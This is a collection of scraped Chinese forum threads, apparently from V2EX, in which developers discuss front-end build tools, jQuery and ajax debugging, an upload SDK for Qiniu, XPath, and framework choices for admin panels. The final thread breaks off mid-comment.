{"content": ["<div class=\"topic_content\">现在公司用的是自己的自动化工具，想深入学习一下原理，怎奈不像 gulp 、 grunt 的资料这么多。想在国庆最后三天学一个，不知道学哪个。</div>", "<div class=\"topic_content\">有同样疑惑的人，推荐 webpack ，目前用着不错</div>"], "reply": "51", "tittle": "各位前端，大家现在用的是 gulp 还是 grunt", "comment": ["gulp 和 webpack 混用中\r", "\r", "grunt 已经基本淘汰了吧", "webpack", "我学习的时候 grunt 似乎都不推荐学习。所以直接学了 gulp 。现在 webpack 也很值得一学。", "webpack", "gulp ， webpack 总感觉现在接触的项目都不合适用······", "webpack ， gulp 也过时了", "npm scripts + webpack", "现在 npm script 逼哥最高", " 嗯 先入手 gulp 了 看了下 webpack ，感觉不适合现在的我", "gulp", "用 gulp ，配合 IDEA 感觉还行；", "哈哈，现在 npm script + makefile 逼格最高", "我连 makefile 都在用， makefile 的自动依赖处理，静态模式简直 666 ， 10 行代码就能为我的自造语言 smooth 编译整个工程。", "话说可以造一个轮子，用来实时追踪文件依赖的并且重编译，今晚有心情就写出来", "webpack ＋ npm scripts", "可以直接考虑 rollup ： ", "webpack 也快过时了。", "gulp, grunt, rollup 都已经过时了，现在流行 sucks", " 来", "不是 brunch 吗?最新的构建工具,实用的话还是 glup+webpack", "Dan Abramov: I actually like that web people can ’ t agree on anything. Pushing the platform forward!\r", "webpack +1", "刚开始的时候看过一点 grunt ，后来直接上 webpack ，目前一直在使用", "gulp 用的人多", "gulp, webpack, 目测接下来会是 rollup or webpack2", "之前用过 grunt ，不过早些时候已经转 webpack 了……", "穿越了？", "13 格有点高，还是静静用淘汰的 grunt ……", "直接 npm script 那需要什么 grunt gulp", "gulp 、 webpack 、 npm script 三者混用中...", "很多时候是跟着团队走的，以前团队用 webpack ，自己做项目就用 webpage ，现在团队用 gulp ，我自己做项目就习惯着两者混用，", "gulp 和 webpack 不冲突，不过趋势是只用 webpack + npmscripts 了", "webpack 为主，见一些好的开源项目用的是 gulp+webpack 准备学一下 gulp", "grunt 和 webpack 都很在用", "框架是 react ，理所当然的 npm script & webpack", "webpack & gulp", "前端果然进化神速。。。我感觉 grunt 才没多久啊。。。", "楼上有人说 webpack 都要过时了。 omg", "gulp 和 grunt 都过时了，用 webpack", "不管用哪个能解决问题就好了！何必浮躁！！！", "什么？ webpack 都要过时了？", "Makefile + Webpack + Gulp", "Makefile 這種上古神器居然還有人用…… 真讓人懷念", "npm scripts 哈哈哈", " sucks 是啥。。 Google 了一圈没找到", " 估计是自己造的轮子", " 随便写的，根本没有这玩意儿。。。", " 哈哈哈 大哥大哥！ 我服了", "从 grunt 直接跳到了 webpack ，没有用过 gulp", "现在只专注用 webpack 打包 vue 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我现在需要用 js 处理一段以字符串形式输入的 html 。我发现下面这段程序无法打印出我要的结果，研究了好久实在看不出哪里有问题，特来求助！</p>\n<pre><code>&lt;html&gt;\n\n&lt;head&gt;\n&lt;script src=\"https://code.jquery.com/jquery-3.1.1.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;script&gt;\nvar str = '&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=\"myclass\"&gt;content&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;';\nvar doc = $.parseHTML(str);\nvar title = $(doc).find('#myclass');\nalert($(title).html());\n&lt;/script&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n&lt;/html&gt;\n</div></div>"], "reply": "27", "tittle": "为什么这段 js 出不了我想要的结果呢？", "comment": ["就是先 parseHTML ，然后 find id 为 myclass 的元素（就是那个<h1>），但是为什么提示 undefined 呢？", "有问题么 整个代码里没看到 title 元素 当然是 undefined 了\r", "就算是也是$(\"title\") 只有 document 用的不是引号的", "$(document)？", "doc 就是 #myclass", "调试一下不就知道了么", "id=\"myclass\" 外面再包裹一层 div", " …………………………………………谢谢！可是，这是为什么，是不是没有<div>就找不到了？？", "感谢 cismous 的回复，把上面代码<h1>外面再加一层<div>之后这段代码就可以正常 alert 出 title 了。所以现在我又有新的疑问了：这是为什么？？", "原因是 jquery 从 body 的直接子元素开始解析，所以 h1 是顶级节点，自己 find 自己，当然 find 不到", " 因为 parse 后的结果就是<h1 id=\"myclass\">content</h1>\r", "其余的标签被去掉了", " 这句话求出处，官方文档我刚才查了他是调用的\"native method\"去做的解析，所以跟 jq 无关，问题出在 parse 那句，单独用 jquery 操作 body html header 里的东西都是没问题的", "打印一下 str 的值在 parse 后的变化嘛。你会发现只有 h1 标签，那么你怎么 find 出来呢", "楼主可以看看 alert($(doc).html)", "console.log($(str).find('#myclass').html());", "我建议楼主先把 html 基础和 jQuery 基础看一看吧。\r", "第一，调试的时候，你先用 console.log()把变量输出到控制台看一看，比如这个例子里 console.log(title)的结果为 []， console.log(doc)的结果才是 h1 元素。\r", "第二， jQuery 的 find(selector): Get the descendants of each element in the current set of matched elements, filtered by a selector, jQuery object, or element.\r", "其中 descendant 的意思是 后代，子孙，你在 h1#myclass 元素里，用.find()查找后代中 id 为 myclass 的元素，当然找不到。\r", "\r", "再次建议：找本书把基础学一学。", "parseHTML 用错了", "<!DOCTYPE html>\r", "<html>\r", "<head>\r", "<meta charset=\"UTF-8\">\r", "<title>ppi</title>\r", "</head>\r", "<body>\r", "<script>\r", "function ppicomputing() {\r", "var height = document.getElementById('height').value;\r", "var width = document.getElementById('width').value;\r", "var diagonal = document.getElementById('diagonal').value;\r", "var ppi= (Math.sqrt(height * height + width * width)) / diagonal;\r", "var ppivalue = document.getElementById('ppivalue');\r", "document.getElementById(\"ppivalue\").value = ppi.toString().substr(0,4);\r", "}\r", "</script>\r", "height<br>\r", "<input type=\"text\" id=\"height\">height<br>\r", "width<br>\r", "<input type=\"text\" id=\"width\">width<br>\r", "diagonal<br>\r", "<input type=\"text\" id=\"diagonal\">diagonal<br>\r", "ppi<br>\r", "<input type=\"text\" id=\"ppivalue\"><br>\r", "<button onclick=\"ppicomputing()\">computing</button>\r", "</body>\r", "</html>", "还有，如果自己练习的时候，需要引用库文件，比如 jquery.min.js ， jquery.js ，建议从官网上下载下来，然后在本地引用，不然每次打开浏览器调试的时候，都要多等几秒钟（可能是我网络不好），不着急吗？", "`\r", "var str = '<html><head></head><body><h1 id=\"myclass\">content</h1></body></html>';\r", "var doc = $.parseHTML(str);\r", "var $title = $(doc).find('#myclass');\r", "alert($title.html());\r", "`", " 这我感觉反倒是个好习惯，对于 jquery 这种超大众库以后肯定是蹭 cdn 的，哪里有用自己流量刷静态资源的", " 自己平时练习没必要用 cdn 吧？我打开的时候要等三秒左右加载，影响个人心情。", "<html>\r", "<head>\r", "<script src=\"https://code.jquery.com/jquery-3.1.1.min.js\"></script>\r", "</head>\r", "<body>\r", "<script>\r", "var str = '<html><head></head><body><h1 id=\"myclass\">content</h1></body></html>';\r", "var doc = $.parseHTML(str);\r", "var title = doc.find('#myclass');\r", "alert(title.html());\r", "</script>\r", "</body>\r", "\r", "</html>\r", "\r", "\r", "看第 9 、 10 行， doc 和 title 已经是变量（看前面的 var ），直接用就可以，$(doc) 这种用法感觉你 jQuery 用混乱了，建议先写原生 js ，明白其中的原理以后再用框架。\r", "\r", "\r", "现在大量使用 jQuery ，导致很多新手只知道 $('#id') 而不知道 document.getElementById('id')。", " 开发环境和生产环境不一样啊，这并不是一个好习惯。", " \r", "开发系统和生产环境当然越接近越好 最多域名、硬件配置不一样\r", "以前是一个网站全相对资源，现在是几乎所有的东西都在别的服务器上，图片有图床，静态有 cdn ，数据源有一些服务器，然后一个登录还要给所有的域名上 cookie ，如果开发的时候图省事全放一个服务器上，等真拆分了有些本来早就应该发现的问题就暴露出来了\r", "其实很多大的类库都有在线的 cdn 地址给你用", " 配置一下呀，上线自动切换成生产环境， dev 环境是可以设置的。这是比较基础的知识吧", " 谢谢，我在本地的确是下载下来调试的，发到 V2EX 上的时候改成 CDN 了。。。。:)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为什么通过 cnpm 来 install http-server 会出现这么多文件夹?是因为依赖吗?但是通过 npm 感觉就没那么多。</p>\n<p><img alt=\"来自七牛云的图片\" src=\"http://ocg5h4y2o.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20161018093529.png\"></p>\n</div></div>"], "reply": "5", "tittle": "为什么通过 cnpm 来 install http-server 会出现这么多文件夹", "comment": ["推荐用 Yarn     ", "因为你用了 npm3", "cnpm 会把包下载到以 version@package_name 命名的目录里，然后创建一个 package_name 的目录链接到原目录。 npm 是直接存档到 package_name 目录。", "alias cnpm=\"npm --registry=https://registry.npm.taobao.org \\\r", "        --cache=$HOME/.npm/.cache/cnpm \\\r", "        --disturl=https://npm.taobao.org/dist \\\r", "        --userconfig=$HOME/.cnpmrc\"\r", "\r", "\r", "cnpm 不就是指定了几个路径吗，不应该有区别吧，除非你的.cnpmrc 和.npmrc 不一致。", " 哦明白了， npm 其实也下了很多依赖 只是文件夹层层嵌套了，也不知道哪种方式好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/FrankFang/best-chinese-front-end-blogs/issues/11\" rel=\"nofollow\">https://github.com/FrankFang/best-chinese-front-end-blogs/issues/11</a></p>\n<h3><a href=\"https://github.com/xufei/blog/issues/37\" rel=\"nofollow\">对当前单页应用的技术栈思考</a> - 徐飞</h3>\n<p><strong>评论</strong></p>\n<p>三年前，我们写 HTML 、写 CSS 、写 JS ；</p>\n<p>三年后，我们不写 HTML 、不写 CSS 、不写 JS ；只写需要转译的、无法运行在所有浏览器上的 JS 。</p>\n<p>听说大家的开发效率都上去了，真是恭喜啊。</p>\n<p>既然前端这么不待见 JS ，明年干脆连 JS 也不写了吧，直接写 <a href=\"https://www.typescriptlang.org/\" rel=\"nofollow\">TypeScript</a>、<a href=\"http://elm-lang.org/\" rel=\"nofollow\">Elm</a> 吧（我没开玩笑 😂）</p>\n<hr>\n<h3><a href=\"http://www.zcfy.cc/article/1223\" rel=\"nofollow\"> [译] 少写代码少填坑</a> - 月影</h3>\n<p><strong>评论</strong></p>\n<p>看看现在网页里面的 JS 文件（不包括 HTML 、 CSS ）多大了：</p>\n<ul>\n<li>百度首页 - 150k+ 的 JS ，用了 jQuery</li>\n<li>知乎首页 - 450k+ 的 JS ，用了 Angular</li>\n<li>饿了么首页 - 120k 的 JS ，用了 Angular</li>\n<li>淘宝首页 - 340k+ 的 JS ，用了 KISSY</li>\n<li>新浪微博首页 - 500k+ 的 JS ，不知道用的什么 :(</li>\n<li>1688 首页 - 200k+ 的 JS ，用了 jQuery</li>\n<li>Google 首页 - 169k 的 JS</li>\n</ul>\n<p>我不知道这么多 JS 是否有必要，我只知道：</p>\n<blockquote>\n<p>代码越多， BUG 越多。</p>\n</blockquote>\n<hr>\n</div></div>", "<div class=\"topic_content\">纠正，应该是在所有浏览器上都无法运行的 JS</div>", "<div class=\"topic_content\">大家主要还是看文章吧\r<br>我瞎评的</div>"], "reply": "27", "tittle": "近期前端文章推荐&吐槽", "comment": ["功能越多 代码越多", "楼主的见解和分享很不错，持续关注", "需求就这多，有什么办法？", "新浪的产品设计有问题，尤其是那个乱序时间线，别的不学学这个 jb 东西，技术已经不评价，而且新浪是少有的会员一样看广告的公司\r", "这样的公司速速倒闭为好", " 分两个页面呀", "语言越多， bug 越多", " 会员专属广告，第一次看到这个词的时候我震惊了，这是得多么天才的人才能想出来的啊！", " 那是产品的事，产品出成啥样，我们有什么办法？本质上程序员就是需求翻译机（摊手）", "我实在是无力吐槽你了。。。", " 我说的是事实你要吐槽什么……", "图文首页（全部资源）一般控制在 500k 或 600k 以内，尽量吧", "这个世界本来就是少部分人引领风潮\r", "\r", "明星烫个发型，这个世界有一半少女少男会跟着模仿\r", "\r", "世界上 5 亿用户公司用的东西，一个用户 300 的也会跟着跑", "1.跟你为什么用高级语言写代码，而不用或者很少用机器语言的道理一样。本质是为因为牺牲可以忽略不计的性能损耗（或者说可以接受的）而换来提升开发效率的新工具(语言)，学习有代价，但是发展潮流如此。学习了可能最终被市场判定为失败的尝试白白浪费时间，不学习可能搭不上时代最前沿、机会最多的列车。\r", "\r", "2.关于说文件太大，君可知现在技术界的论调是软件的开发速度跟不上硬件的更新速度，而网络的提升在近几年也是有目共睹，现在一张图片动则 N 个 mb ，页面有几百 kb 的 js 并不是大问题。而关于代码复杂度，所以说要模块化、模块化再模块化，要解耦、解耦再解耦，要架构设计、架构设计再架构设计，而后面这个问题也正是前面 1.里各种新生语言准备(或可以)解决(或缓解)的。", "直接写 Typescript 、 Elm 没什么不对吧，编程说到底就是抽象再抽象，复杂度上来了就要有更好的抽象工具。", " 然而现实就是年初买新浪股票的人，现在都财务自由了", " 垄断的力量+阿里的注资，没办法", " 并没有发现前端加班变少，抱怨变少呀", "很多原因都可能导致框架和工具滥用情况的发生。说几个职场里的理由吧：比如故意提升技术门槛，防止被写后台的看不起；项目虽小，但是为了用框架而用框架，这样才好将来跳到大厂时有技术筹码；总用老技术，上至老板，下至小弟会认为你不思进取；项目经验少，被工具或框架花花绿绿的 demo 蒙骗了等等。有时候其实我也会不得已滥用。。。", " \r", "你的问题在 LZ 的问题讨论范围内吗，只要解决两个问题，就能不加班。\r", "1.个人能力够不够\r", "2.公司制度怎么样\r", "有能力就去解决吧，这不是某某语言的问题。", " 那倒是，说到底都是人的问题。\r", "我就是吐槽一下现在火（ zhe ）热（ teng ）的前端而已。", "楼主专业吐槽前端，有什么动机吗？利益无关，我写 PHP 的。", " 吐槽能赚钱么……   你看我老是上 Top 10 ，就知道我只是上 Top 10 上瘾而已。\r", "不过这一篇只是骗 star 来的", " 这帖子只骗了 4 个 star ，唉……", " 为什么吐槽你？？ 讲道理应该有因得果，一步步去说明。你这几篇帖子里的逻辑错误百出，也就忽悠下没有辩证思维的小白，而你又是喜欢写这样的帖子，所以说我懒得吐槽你。", " 你指出漏洞呗", " 我的习惯是不说全面的观点。有人说 react 好，我就说 react 的缺点。你听一下两个人的观点就有自己的观点。", "看了一下，没啥干货，自己用 bootstrap 怪谁？让写*{padding:0;margin.:0;}的人又能啊 Q 一下。子元素选择器！后面跟上通配符！真是天才写法。与 js 相关的路由懒得说了，本来就是 hashchange 和 popstate 事件，只不过别人给你做好了。\r", "并不值得推荐。标题党嫌疑。\r", "\r", "代码越多， bug 越多，这个仅仅是你“说出来”的一句话，然后呢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://ww3.sinaimg.cn/large/550f5a78gw1f8y3b2wozqj21kw11lgy3.jpg\" rel=\"nofollow\">http://ww3.sinaimg.cn/large/550f5a78gw1f8y3b2wozqj21kw11lgy3.jpg</a></p>\n</div></div>"], "reply": "1", "tittle": "请教一个 JavaScript 异步编码的问题", "comment": ["面试题自己写好吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"screen shot 2016-10-19 at 03 33 01\" src=\"https://cloud.githubusercontent.com/assets/27926/19494750/25a7bd76-95b3-11e6-9c6c-e1f0f3801f89.png\"></p>\n</div></div>"], "reply": "11", "tittle": "混乱之治", "comment": ["Angular 1 should be included", "又没有 elm", "backbone 的粉都是几年前加的吧\r", "这东西真的，太难用了，别人专注 VC 层 backbone 是专注 M 层", "感觉不是 Trending 啊， total 的", "过不了多久就冰封王座了", "不如叫百家齐鸣？", " 嗯，也是可以的", " 统计出来，就知道流行什么了 哈哈", " 好的，加上\r", "\r", " 这个也加上\r", "\r", "晚点再更新，忙咯", " backbone 在那几年太🔥了", " 233 ，希望社区能初一个类 rails 的，但保持多样性还是很重要。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1><a href=\"https://github.com/lsxiao/qiniu4js\" rel=\"nofollow\">lsxiao/qiniu4js</a></h1>\n<p>七牛 JavaScript 浏览器文件上传 js sdk.</p>\n<p>使用 TypeScript 编写，不依赖任何三方库，纯代码不包含任何界面元素，使用 HTML5 文件 API 上传(目前和未来不会支持 HTML4 以及 FLASH)。</p>\n<p>支持 UMD 模块导入。</p>\n<h2>已完成</h2>\n<ul>\n<li>[x] 文件直传</li>\n<li>[x] 多文件上传</li>\n<li>[x] token 共享</li>\n<li>[x] 自动重传</li>\n<li>[x] 任务拦截器</li>\n<li>[x] 文件过滤</li>\n<li>[x] 多实例(可以创建多个上传实例,互不影响)</li>\n</ul>\n<h2>待完成</h2>\n<ul>\n<li>[ ] 分块上传</li>\n<li>[ ] 图片裁剪</li>\n<li>[ ] 图片质量压缩</li>\n<li>[ ] 使用七牛 API 进行图片处理</li>\n</ul>\n<h2>安装</h2>\n<pre><code>sudo npm install qiniu4js --save\n</code></pre>\n<h2>导入</h2>\n<h3>浏览器</h3>\n<pre><code>    &lt;script src=\"qiniu4js.js\"&gt;&lt;/script&gt;\n</code></pre>\n<h3>es6</h3>\n<pre><code>    import {UploaderBuilder} from 'Qiniu'\n</code></pre>\n<h3>CommonJS</h3>\n<pre><code>    {UploaderBuilder} =  require('Qiniu')\n</code></pre>\n<h2>使用方法</h2>\n<pre><code>//构建 uploader 实例\nlet uploader = new Qiniu.UploaderBuilder()\n\t.debug(false)//开启 debug ，默认 false\n\t.retry(0)//设置重传次数，默认 0 ，不重传\n\t.auto(true)//选中文件后立即上传，默认 true\n\t.multiple(true)//是否支持多文件选中，默认 true\n\t.accept(['.gif','.png','video/*'])//过滤文件，默认无，详细配置见 http://www.w3schools.com/tags/att_input_accept.asp\n\t.tokenShare(true)//在一次上传队列中，是否分享 token,如果为 false 每上传一个文件都需要请求一次 Token ，默认 true\n\t.tokenFunc(function (setToken,task) {\n\t    //token 获取函数， token 获取完成后，必须调用`setToken(token);`不然上传任务不会执行。\n\t\tsetTimeout(function () {\n\t\t\tsetToken(\"token\");\n\t\t}, 1000);\n\t})\n\t//任务拦截器\n    .interceptor({\n        //拦截任务,返回 true ，任务将会从任务队列中剔除，不会被上传\n    \tonIntercept: function (task) {\n    \t\treturn task.file.size &gt; 1024 * 1024;\n    \t},\n    \t//中断任务，返回 true ，任务队列将会在这里中断，不会执行上传操作。\n    \tonInterrupt: function (task) {\n    \t\tif (this.onIntercept(task)) {\n    \t\t\talert(\"请上传小于 1m 的文件\");\n    \t\t\treturn true;\n    \t\t}\n    \t\telse {\n    \t\t\treturn false;\n    \t\t}\n    \t},\n    }   \n    //你可以添加多个任务拦截器\n    .interceptor({...})\n\t.listener({\n\t\tonReady(tasks) {\n\t\t\t//选择上传文件确定后,该生命周期函数会被回调。\n\t\t\t\n\t\t},onStart(tasks){\n\t\t\t//开始上传\n\t\t\t\n\t\t},onTaskGetKey(task){\n\t\t    //为每一个上传的文件指定 key,如果不指定则由七牛服务器自行处理\n\t\t\treturn \"test.png\";\n\t\t\t\n\t\t},onTaskProgress: function (task) {\n\t\t    //每一个任务的上传进度,通过`task.progress`获取\n\t\t\tconsole.log(task.progress);\n\t\t\t\n\t\t},onTaskSuccess(task){\n\t\t\t//一个任务上传成功后回调\n\t\t\t\n\t\t},onTaskFail(task) {\n        \t//一个任务在经历重传后依然失败后回调此函数\n        \t\n        },onTaskRetry(task) {\n        \t//开始重传\n        \t\n        },onFinish(tasks){\n            //所有任务结束后回调，注意，结束不等于都成功，该函数会在所有 HTTP 上传请求响应后回调(包括重传请求)。\n            \n\t\t}}\n\t}).build();\n\t\n\t\n//如果 auto 设置为 false,则需要手动启动上传。\n//uploader.start();\n\n\n//由于安全原因， display:none 的 file input ，无法通过代码调用 click 方法，必须通过如下处理，让用户来实现 click ，从而打开文件选择窗口:\n\n//你可以自行监听 HTML 元素的 click 事件，在回调函数内部打开文件选择窗口。你也可以使用 jQuery 监听，下面使用的是原生的 JavaScript 的方式。\nbutton = document.getElementById('button');\nbutton.addEventListener(\"click\", function () {\n\tuploader.chooseFile();\n}\n</code></pre>\n<h2>版本说明</h2>\n<ul>\n<li>\n<p>0.0.8 (2016-10-19)</p>\n<ul>\n<li>fix bug,当没有选中任何文件的时候，会触发上传函数。</li>\n</ul>\n</li>\n<li>\n<p>0.0.7 (2016-10-19)</p>\n<ul>\n<li>更换上传域名为 <a href=\"http://upload.qiniu.com\" rel=\"nofollow\">upload.qiniu.com</a></li>\n</ul>\n</li>\n<li>\n<p>0.0.6 (2016-10-19)</p>\n<ul>\n<li>绕过缓存，避免每次都上传同样的文件。</li>\n</ul>\n</li>\n<li>\n<p>0.0.5 (2016-10-19)</p>\n<ul>\n<li>tokenFunc(setToken,task)增加 task 参数</li>\n</ul>\n</li>\n<li>\n<p>0.0.4 (2016-10-19)</p>\n<ul>\n<li>修复了一个关于 accept 选项的 bug 。</li>\n</ul>\n</li>\n<li>\n<p>0.0.3 (2016-10-19)</p>\n<ul>\n<li>任务拦截器实现。</li>\n</ul>\n</li>\n<li>\n<p>0.0.2 (2016-10-19)</p>\n<ul>\n<li>基本功能的实现。</li>\n</ul>\n</li>\n</ul>\n<h2>维护人</h2>\n<p>知乎 : <a href=\"https://www.zhihu.com/people/lsxiao\" rel=\"nofollow\">@面条</a></p>\n<p>Github : <a href=\"https://github.com/lsxiao\" rel=\"nofollow\">@lsxiao</a></p>\n<h2>开源许可</h2>\n<p>MIT</p>\n</div></div>"], "reply": "5", "tittle": "七牛浏览器 js sdk", "comment": ["点赞支持一下，马上用到项目中试试；七牛官方 sdk 的控件在页面元素出现变动时候，会出现选择文件控件覆盖到其他元素的问题，我试试楼主的", "赞一个,建议再加上 https 下上传的支持.", " 今天会完成分块上传的功能，可以再等等。", " 发现编译后的 js 用了这句\r", "        this._listener = Object.assign(new SimpleListener(), builder.getListener);\r", "\r", "这 Object.assign 是 ES6 特性，在手机浏览器上不支持，应该让编译器输出个 es5 版本的才能更好支持", " \r", "以及一处用了 endsWith ，，也是手机浏览器没有的。。。我暂时手动 hack 了来用，，"]},
{"content": ["<div class=\"topic_content\">RT ， 试了一下发现不能触发，大家有没有什么办法？</div>"], "reply": "5", "tittle": "WebUploader 有没有办法用代码触发点击上传", "comment": [" 我意思是触发点击按钮， 出现文件选择对话框 类似这样 ", " 应该没办法用代码触发。\r", "for example if you(the script) programmatically click the button in an ajax callback nothing will happen, but if you put the same line of code in an event handler that was raised by the user, it will work.", " \r", "这里写的很清楚，参数 pick 指定选择文件的按钮，请仔细阅读文档。", " 我才明白你的意思，没错，按钮的触发，只能由用户发起。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><span>ddd</span>\naaa\n<span>bbb</span></p>\n<p>如何选取 aaa 的值哇！！</p>\n</div></div>"], "reply": "11", "tittle": "Xpath 选取 text 值", "comment": ["不能，正则吧", "  好像上面没显示出来 是这种<span></span>aaa<span></span>   我要获取 aaa 的值", "/xpath/text()", "xpath2.0 有个 tokenize 方法，类似于 Python 的 split", "text()", "楼主要取 xml 里的第二个孩子，还是 text 里第二列？", "text() 取出来自己做个 split(' ')[1] 啊", "```\r", "\t\tNodeList spanNode = (NodeList) xpath.evaluate(\"/widgets/widget[3]/node()\", inputSource, XPathConstants.NODESET);\r", "\t\tfor(int i = 0; i < spanNode.getLength(); i++) {\r", "\t\t\tNode node = spanNode.item(i);\r", "\t\t\tif(node.getNodeType() == Node.TEXT_NODE) {\r", "\t\t\t\tSystem.out.println(spanNode.item(i).getTextContent());\r", "\t\t\t}\r", "\t\t}\r", "```\r", "```\r", "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r", "<widgets xmlns:prefix=\"http://www.eclipse.org/birt/2005/design\">\r", "\t<widget>\r", "\t\t<manufacturer/>\r", "\t\t<dimensions/>\r", "\t</widget>\r", "\t<widget>\r", "\t\t<manufacturer/>\r", "\t\t<dimensions>101</dimensions>\r", "\t\t<attr1 name=\"honey\">10333</attr1>\r", "\t</widget>\r", "\t<widget>\r", "\t\t<span>bbb</span>\r", "\t\taaa\r", "\t\t<span>ccc</span>\r", "\t</widget>\r", "</widgets>\r", "```", "dom 操作用 xpath ， text 操作用 re", "  re 是啥。。没用过。。", " 正则"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://about.gitlab.com/2016/10/20/why-we-chose-vue/\" rel=\"nofollow\">https://about.gitlab.com/2016/10/20/why-we-chose-vue/</a></p>\n</div></div>"], "reply": "3", "tittle": "GitLab: Why we choose vue.js", "comment": ["If Backbone was anarchy (no one in charge) and Angular is a dictatorship (the Angular team is in charge), I'd say Vue.js is like socialism: you are in definitely in charge, but Vue.js is always within reach, a sturdy, but flexible safety net ready to help you keep your programming efficient and your DOM-inflicted suffering to a minimum.\r", "\r", "有中国特色的社会主义框架-Vue.js", "除了比喻成 socialism 不妥以外写的都挺好", "也确实是中国人写的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近用了几个 jquery 插件，都会在指定场景（比如手机端的滚动）出现错误提示：</p>\n<p>Unable to preventDefault inside passive event listener due to target being treated as passive.</p>\n<p>我觉得这不是个例，可能是我使用插件方法不对，这类普遍的问题有什么统一的解决方法嚒。</p>\n</div></div>"], "reply": "2", "tittle": "Unable to preventDefault inside passive event listener 怎么解决", "comment": ["是否是目标元素无法触发那个事件，需要更多信息", "我也遇到了这个问题，同问。我引用的是：\r", "    <script src=\"scripts/jquery-1.10.2.js\"></script>\r", "    <script src=\"scripts/jquery.mobile-1.4.5.js\"></script>"]},
{"content": ["<div class=\"topic_content\">$.ajax({\r<br>\t\t\t\t\turl: default_host + '/mobile/getLoanActionSummary?' + $.param(param),\r<br>\t\t\t\t\ttype: 'GET',\r<br>\t\t\t\t\theaders: addHeaders(),\r<br>\t\t\t\t\tsuccess: function(res) {\r<br>\t\t\t\t\t\tif (res.ret == 1) {\r<br>\t\t\t\t\t\t\trecord.showLoanRecord(res.result);\r<br>\t\t\t\t\t\t} else {\r<br>\t\t\t\t\t\t\trecord.offScroll();\r<br>\t\t\t\t\t\t}\r<br>\t\t\t\t\t},\r<br>\t\t\t\t\terror : function(err) {\r<br>\t\t\t\t\t\talert('请求数据失败');\r<br>\t\t\t\t\t\talert('readyState:' + err.readyState + '/status:' + err.status + '/statusText:' + err.statusText);\r<br>\t\t\t\t\t\tconsole.log(err);\r<br>\t\t\t\t\t\trecord.offScroll();\r<br>\t\t\t\t\t},\r<br>\t\t\t\t}).always(function(){\r<br>\t\t\t\t\tcheckLoadingHide();\r<br>\t\t\t\t});</div>"], "reply": "11", "tittle": "ajax 请求，在 chrome 正常，换到 ie 之后就请求被中断了，都没发出去，哪位大神可以帮忙看看啊？", "comment": ["跨域 cors 吗？", " 嗯嗯，有跨域，当前站点是 http ，请求的是 https ，不知道与这个有没有关系？", "Cached?", " 有的。 IE8 、 IE9 下面要用 XDomainRequest\r", "跨域协议也要一致\r", "不知是 iE 几，不知响应头，不知浏览器给出的信息", "不要用 alert....用 console.log 然后去 console 看具体哪儿炸了", " 看到你给的链接了，跨域协议要一致，那就是 ie 下没有办法解决这个问题吗？另外，我目前这个页面是在 app 里面调用的，安卓显示不出来，是因为内核的原因吗？", " 你都知道问题所在了，就可以自己去寻求解决方法哦。", " ， IE 解决跨域用 jsonp 吧", "type: 'GET',\r", "cache: false, // 加上试试\r", "...", " 谢谢，已经搞定了，虽然最终不是我这边作了修改，而是 app 那边作了修改，忽略了 https 。。我就这样浪费了如此久的时间。。\r", "\r", " 你说的方法我在网上查看到了，试了没效果，不知道是不是我写错了，不过现在我的问题已经搞定了，自己再研究研究\r", "\r", " 你说的这种方式我还真没试过，我去试试"]},
{"content": "", "reply": "2", "tittle": "拖动分类排序与移动分类 JS 有哪些", "comment": [" IE6+，可定制", "Sortable"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>网站管理后台目前是使用 AngularJs 1.X 版本来写，由于早期为了快速迭代版本，导致现在的坑越来越多，所以现在考虑把网站后台重构，所以需要考虑用什么样的框架来写更好，请有经验的人推荐下，如果说下理由更好，感谢。\n</code></pre>\n</div></div>"], "reply": "30", "tittle": "求网站管理后台 js 框架推荐，如果有说明更好。", "comment": ["建议 vuejs ，一周绝逼上手写出来，官方文档都是中文的，特别友好。", "reactjs ，主要是感觉 ant design 好用", "用 vuejs ， UI 用 element-ui", "后台的话， angular 1.x 绝对超级适合，若是性能问题可以尝试在 ng-for 里面加入 track by ，减少 dirty-check 的成本。 angularjs 跟 vuejs 这些是同一个级别的", " \r", "推荐我司的 duang 。\r", "动手写点配置文件就行了。别的不用管。", "angular 是非常好的选择，代码量少，逻辑清晰，生态圈庞大，随便上一个 ngUI 的就行了。 ", "adminLTE + jquery ？", "easyui 会不会有人骂我", "千万别用 angular1", " duang 这个也没有文档啊……", "熟悉 Angular 就用 Angular ，写之前做好设计和规划，写出来就不那么 shit", " easyui 适合企业应用不适合网站后台，他的很多组件实现太重了，尤其是 datagrid ，有很多功能管理界面根本用不到，比如行列冻结、拖动，同理的还有 panel 、 dialog 、 tree 这些的实现，为了兼容 IE 老版本牺牲了太多", "我给你的建议\r", "(1)bootstrap 作为最基本的 UI 就够了，反正是内部使用\r", "(2)选一个好的图表组件，如果没有什么主意，不要想了，直接上 highcharts ，以后各种花式作图都能应付的了\r", "(3)你需要的是管理后台还是个 dashboard ？不要最后为了炫酷跑偏了， dashboard+后台基于 bootstrap 在网上有大把的主题可以下载，付费的有，免费的也有\r", "(4)不要为了技术和简历盲目 NG ，尤其是内部系统，怎么上线快怎么来，多页面怎么了， iframe 怎么了， tplink 路由器的后台不知道是几年前的技术了，一样在现代浏览器上跑的飞起，功能才是主要的", "用 vuejs 比较符合你的需求 上手也快", " 我一个前同事也这样说过,我感觉 easyui 用户偏后台程序员居多,自我感觉挺方便,开发效率很不错,从专业前端角度来看用起来可能会觉得束缚", "\r", "\r", "sammyjs + 